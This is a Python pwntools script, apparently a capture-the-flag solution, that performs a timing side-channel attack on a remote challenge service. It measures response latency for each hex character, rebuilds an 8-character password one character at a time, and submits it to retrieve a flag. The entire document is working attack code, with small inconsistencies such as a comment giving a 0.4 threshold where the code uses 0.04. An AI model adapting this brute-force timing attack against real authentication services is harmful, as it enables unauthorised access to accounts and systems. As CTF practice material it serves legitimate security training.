from pwn import *
import time
import random

# Target connection details
HOST = 'challenge.ctf.games'
PORT = 31136

# Valid hexadecimal characters for the password
hex_chars = '0123456789abcdef'

# Function to send a guess and receive timing feedback
def send_guess(p, guess):
    try:
        p.sendline(guess)  # Send the guess
        start_time = time.time()
        
        # Wait for a response with a timeout
        response = p.recv(timeout=1)
        elapsed_time = time.time() - start_time
        return response, elapsed_time
    except Exception as e:
        print(f"Error sending guess '{guess}': {e}")
        return None, None  # Return None for response and elapsed time on error

# Function to establish an average latency baseline
def establish_baseline(p, attempts=10):
    total_time = 0
    
    for i in range(attempts):
        p.sendline('')  # Send an empty guess to establish a baseline
        start_time = time.time()
        response = p.recv(timeout=1)
        elapsed_time = time.time() - start_time
        total_time += elapsed_time
        
        # Debug print to show individual attempt time
        print(f"Baseline attempt {i + 1}: Time {elapsed_time:.5f} seconds")
    
    # Return the average baseline time
    average_baseline = total_time / attempts
    print(f"Average baseline latency established: {average_baseline:.5f} seconds")
    return average_baseline

# Function to brute-force each character of the password
def find_password(p, baseline, attempts=2):
    password = ''
    
    for position in range(8):  # Password length is 8
        best_delta = 0
        best_char = ''
        
        for char in hex_chars:
            total_time = 0
            
            # Send each guess multiple times to average the timing
            for attempt in range(attempts):
                # Pad the guess to make it 8 characters long
                # Only modify the current position
                padded_guess = password + char + '0' * (7 - position)  # Fill remaining with '0's
                
                # Skip the first guess to avoid initial latency effects
                if attempt == 0:
                    send_guess(p, padded_guess)  # Send the first guess without measuring
                    continue

                response, elapsed_time = send_guess(p, padded_guess)
                
                if elapsed_time is not None:  # Ensure elapsed_time is valid before adding
                    total_time += elapsed_time
                    print(f"Trying {padded_guess}: Time {elapsed_time:.5f}")
                else:
                    print(f"Skipping guess {padded_guess} due to error")

                # Sleep briefly to avoid overwhelming the server
                time.sleep(0.01)

            # Calculate the average time for this guess
            if attempts > 1:  # Prevent division by zero
                average_time = total_time / (attempts - 1)  # Use attempts - 1 since we discarded the first guess
            else:
                average_time = 0  # Fallback in case no valid attempts were made

            delta_time = average_time - baseline  # Compare against the baseline
            # Adjust delta based on the position in the password
            adjusted_delta = delta_time - (0.1 * (position + 1))
            print(f"Average time for {password + char}: {average_time:.5f} (Delta: {delta_time:.5f}, Adjusted Delta: {adjusted_delta:.5f})")
            
            # Check if this adjusted delta is greater than 0.4
            if adjusted_delta > 0.04:
                password += char  # Automatically accept this character
                print(f"Character '{char}' accepted as part of the password at position {position}.")
                break  # Move to the next position in the password

            # Check if this adjusted delta is the best (largest increase from baseline)
            if adjusted_delta > best_delta:
                best_delta = adjusted_delta
                best_char = char
        
        # If we haven't accepted a character automatically, append the best one
        if adjusted_delta <= 0.04:
            password += best_char
            print(f"Password so far: {password}")

    return password

# Function to submit the final password and get the flag
def submit_password(p, password):
    response, _ = send_guess(p, password)
    return response.decode().strip()

# Run the exploit
if __name__ == '__main__':
    # First connection: Establish baseline
    p_baseline = remote(HOST, PORT)
    baseline = establish_baseline(p_baseline, attempts=10)  # Baseline created using 10 attempts
    print(f"Baseline latency established: {baseline:.5f} seconds")
    p_baseline.close()

    # Second connection: Perform timing attack
    p_attack = remote(HOST, PORT)
    final_password = find_password(p_attack, baseline, attempts=2)
    print(f"Recovered password: {final_password}")

    # Submit the recovered password using the same connection
    final_response = submit_password(p_attack, final_password)
    print(f"Final response: {final_response}")

    p_attack.close()  # Close the connection at the end
